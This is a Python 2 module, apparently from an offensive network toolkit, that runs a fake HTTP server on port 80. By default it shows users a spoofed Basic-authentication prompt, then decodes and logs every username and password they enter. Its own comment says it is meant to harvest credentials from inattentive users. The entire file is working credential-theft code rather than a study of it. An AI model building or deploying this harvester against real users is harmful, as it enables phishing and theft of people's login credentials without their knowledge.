import util
import BaseHTTPServer
import base64, socket
from service import Service
from threading import Thread

#
# Emulate an HTTP server.  If no default page is entered, a auth realm will be presented instead.
# This can be used to harvest usernames/passwords from users not paying any attention.
#

class HTTPService(Service):
	def __init__(self):
		self.server = 'B4114stS3c HTTP Server v3.1'
		self.httpd = None
		self.root = None
		super(HTTPService,self).__init__('HTTP')
	
	#
	# initialize in bg; for interfacing with
	#
	def initialize_bg(self):
		try:
			util.Msg('[enter] for default credential prompt.')
			self.root = raw_input('[+] Enter root file: ')
		except Exception, j:
			util.Error('Error with root; %s'%j)
			return
		util.Msg('Running HTTP server')
		http_thread = Thread(target=self.initialize)
		http_thread.start()
		return

	def initialize(self):
		self.httpd = BaseHTTPServer.HTTPServer(('', 80), self.handler)
		self.running = True
		
		try:
			while self.running:
				self.httpd.handle_request()
		except KeyboardInterrupt:
			self.running = False
			return
		except Exception, j:
			util.Error("Error: %s"%j)
			return

	#
	# a little magic since we've got to have a request handler class
	#
	def handler(self, *args):
		context = { 
				'root': self.root,
				'dump': self.dump,
				'log_data': self.log_data,
				'log_file' : self.log_file
				  }
		RequestHandler(context, *args)
	
#
# handle HTTP requests; just HEAD/GET right now.  POST if needed be.
#
class RequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
	def __init__(self, context, *args):
		self.context = context
		try:
			BaseHTTPServer.BaseHTTPRequestHandler.__init__(self, *args)
			self.server.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		except Exception, j:
			pass

	def send_headers(self):
		self.server_version = 'b4ll4sts3c http server'
		self.sys_version = 'v3.1'
		self.send_response(200)
		self.send_header('Content-type', 'text/html')
		self.end_headers()

	def send_auth_headers(self):
		self.send_response(401)
		self.send_header('WWW-Authenticate', 'Basic realm=\"Security Realm\"')
		self.send_header('Content-type', 'text/html')
		self.end_headers()

	def do_HEAD(self):
		self.send_headers()

	def do_GET(self):
		try:
			# go away
			if self.path == '/favicon.ico':
				return
			# serve user-specified page	 
			if not self.context['root'] is None and util.does_file_exist(self.context['root']):
				self.send_headers()
				fle = open(self.context['root'], 'rb')
				self.wfile.write(fle.read())
				fle.close()
				return

			# else serve up the authentication page to collect credentials	
			auth_header = self.headers.getheader('Authorization')
			if auth_header is None:
				self.send_auth_headers()
			elif auth_header.split(' ')[1] == base64.b64encode('ballast:security'):
				self.send_headers()
				self.wfile.write('Authenticated :)')
			elif not auth_header is None:
				if self.context['log_data']:
					self.context['log_file'].write(base64.b64decode(auth_header.split(' ')[1]) + '\n')
				if self.context['dump']:
					util.Msg('Collected: %s'%base64.b64decode(auth_header.split(' ')[1]))
				self.send_auth_headers()
			else:
				self.send_auth_headers()
		except Exception, j:
			if j.errono == 32:
				# connection closed prematurely
				return
			util.Error('Error: %s'%j)	
			return
		except KeyboardInterrupt:
			return

	# override logger
	def log_message(self, format, *args):
		if self.context['dump'] or self.context['log_data']:
			tmp = ''
			for i in args:
				tmp += ' '
				tmp += i
			if self.context['dump']:
				print self.address_string() + tmp
			if self.context['log_data']:
				self.context['log_file'].write(self.address_string() + tmp + '\n')
